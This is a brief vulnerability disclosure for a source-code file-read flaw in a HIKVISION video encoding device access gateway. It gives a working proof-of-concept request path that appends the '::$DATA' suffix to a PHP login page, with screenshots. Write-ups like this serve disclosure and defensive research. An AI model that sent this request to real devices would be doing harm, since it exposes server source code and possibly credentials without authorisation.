# HIKVISION Video Encoding Device Access Gateway $DATA Any file reading

## Vulnerability Description

HIKVISION Video encoding device access gateway has configuration error characteristics, and the special suffix requests the php file to read the source code.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">HIKVISION Video Encoding Device Access Gateway</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628164956874-f53d9c48-6820-4c43-a3e5-aea8b6415ae8.png)

Verify POC

```plain
/data/login.php::$DATA
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628165037205-928b64e5-2476-4511-afee-c562b17a031d.png)